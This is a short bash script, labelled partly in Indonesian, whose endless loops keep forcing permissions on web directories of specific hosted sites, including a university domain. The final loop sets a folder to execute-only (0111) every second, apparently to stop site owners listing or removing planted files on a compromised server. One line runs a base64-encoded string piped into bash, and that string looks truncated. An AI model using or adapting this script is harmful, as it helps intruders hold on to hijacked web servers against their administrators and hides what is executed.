#!/bin/bash

WATCH_DIR="/home/pariwisata/public_html/bulan/"

while true; do
    find "$WATCH_DIR" -type d ! -perm 755 -exec chmod 755 {} \;
    sleep 5
done

while true; do find /home/pariwisata/public_html/bulan/ -type f ! -perm 755 -exec chmod 755 {} \;; sleep 5; done

=================================================================
VERSI BASE64
echo "sZWVwIDE7IGRvbmU=" | base64 --decode | bash

================================================================
VERSI TERMINAL ONLY
while true; do find /home/unidayan-informatika/htdocs/informatika.unidayan.ac.id/public/build/iqos/ -type d ! -perm 0111 -exec chmod 0111 {} \;; sleep 1; done
